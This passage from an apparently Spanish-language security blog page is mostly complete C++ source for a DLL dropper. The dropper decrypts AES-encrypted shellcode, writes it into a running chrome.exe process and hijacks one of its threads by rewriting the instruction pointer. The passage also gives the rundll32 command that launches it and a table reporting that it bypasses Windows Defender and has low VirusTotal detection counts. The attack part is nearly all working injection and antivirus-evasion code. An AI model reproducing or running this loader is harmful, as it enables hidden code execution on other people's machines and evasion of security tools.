<span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xc3</span> <span class="p">};</span>

<span class="c1">// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_CLIENT_ID</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">UniqueProcess</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">UniqueThread</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CLIENT_ID</span><span class="p">,</span> <span class="o">*</span><span class="n">PCLIENT_ID</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">VirtualAlloc_t</span><span class="p">)(</span>
	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
	
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlMoveMemory_t</span><span class="p">)(</span>
	<span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> 
	<span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> 
	<span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">FARPROC</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlCreateUserThread_t</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PSECURITY_DESCRIPTOR</span> <span class="n">SecurityDescriptor</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">CreateSuspended</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackReserved</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartParameter</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PCLIENT_ID</span> <span class="n">ClientId</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateThreadEx_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">hThread</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpStartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackReserve</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">lpBytesBuffer</span><span class="p">);</span>


<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>
	
	
<span class="kt">int</span> <span class="n">AESDecrypt</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
	<span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
	<span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
	<span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="n">FindProcess</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procname</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HANDLE</span> <span class="n">hProcSnap</span><span class="p">;</span>
        <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">hProcSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//se crear un snapshot de los procesos en ejecución del sistema operativo</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hProcSnap</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> <span class="c1">// se obtiene el tamaño total del objeo definido     </span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// validación del snapshot creado</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// iteración del snapshot</span>
				<span class="c1">//printf("[FindProcess: ] %s \n", pe32.szExeFile);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpiA</span><span class="p">(</span><span class="n">procname</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// comprobación del nombre del proceso</span>
                        <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span> <span class="c1">// obtención del pid del proceso</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">"[FindProcess]: Process Found %s :"</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">" PID %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>       
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span> <span class="c1">//se cierra el snapshot       </span>
        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span> <span class="c1">// retorno de pid</span>
<span class="p">}</span>


<span class="n">HANDLE</span> <span class="n">FindThread</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">){</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[FindThread] for pid %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">THREADENTRY32</span> <span class="n">thEntry</span><span class="p">;</span>
	<span class="n">thEntry</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">thEntry</span><span class="p">);</span>
    <span class="n">HANDLE</span> <span class="n">Snap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">while</span> <span class="p">(</span><span class="n">Thread32Next</span><span class="p">(</span><span class="n">Snap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">thEntry</span><span class="p">))</span> <span class="p">{</span>
		<span class="c1">//printf("[FindThread] : %d \n", thEntry.th32OwnerProcessID);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">thEntry</span><span class="p">.</span><span class="n">th32OwnerProcessID</span> <span class="o">==</span> <span class="n">pid</span><span class="p">)</span> 	<span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[FindThread] : Thread found %d :"</span><span class="p">,</span> <span class="n">thEntry</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">" ProcessId %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">thEntry</span><span class="p">.</span><span class="n">th32OwnerProcessID</span><span class="p">);</span>
			<span class="n">hThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">thEntry</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">Snap</span><span class="p">);</span>
	
	<span class="k">return</span> <span class="n">hThread</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">Inject</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Inject Context Hijacking thread Of process %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">LPVOID</span> <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">CONTEXT</span> <span class="n">ctx</span><span class="p">;</span>
	<span class="n">hThread</span> <span class="o">=</span> <span class="n">FindThread</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Error, hijack unsuccessful.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Decrypt shellcode </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Allocate memory in external process </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Write shellcode </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">SuspendThread</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>	
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Suspend Thread %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">hThread</span><span class="p">);</span>
	<span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span><span class="p">;</span>
	<span class="n">GetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Get Thread COntext %s </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject] Thread pRemoteCodeAddress : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject] [Hijacking] Thread Rip Next execution instruction: %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">pRemoteCode</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject] [Hijacking] Thread Rip Next execution instruction: %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span><span class="p">);</span>
	<span class="n">SetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Set ThreadContext And ResumeThread wait for execution ..... </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">ResumeThread</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>	
<span class="p">}</span>
	
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>	
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Main] Init Dropper </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">pid</span> <span class="o">=</span> <span class="n">FindProcess</span><span class="p">(</span><span class="s">"chrome.exe"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[Main] chrome.exe PID = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
		<span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> 
						<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span><span class="p">,</span>
						<span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">pid</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hProc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">Inject</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">hProc</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Main] End Dropper </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Ejecución:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe ThreadContextDLL.dll,f0ns1
</code></pre></div></div>

<p><img src="/assets/images/thread_context_dll.png" alt="Thread Context Dll" /></p>

<h2 id="detecciones">Detecciones</h2>

<table>
  <thead>
    <tr>
      <th>Code Type</th>
      <th>Windows Defender Bypass</th>
      <th>AV Bypass</th>
      <th>EDR Bypass</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>EXE inyeccion en el contexto del hilo de proceso externo cifrado AES</td>
      <td>True</td>
      <td>26/72 VT detections</td>
      <td>False</td>
    </tr>
    <tr>
      <td>DLL inyeccion en el contexto del hilo de proceso externo cifrado AES</td>
      <td>True</td>
      <td>7/71 VT detections</td>
      <td>False</td>
    </tr>
  </tbody>
</table>

<p><img src="/assets/images/Thread_context_dll_detections.png" alt="Thread Context Dll detections" /></p>

<p><a href="./injection_types.html">back</a></p>

      </section>
    </div>
  </body>
</html>
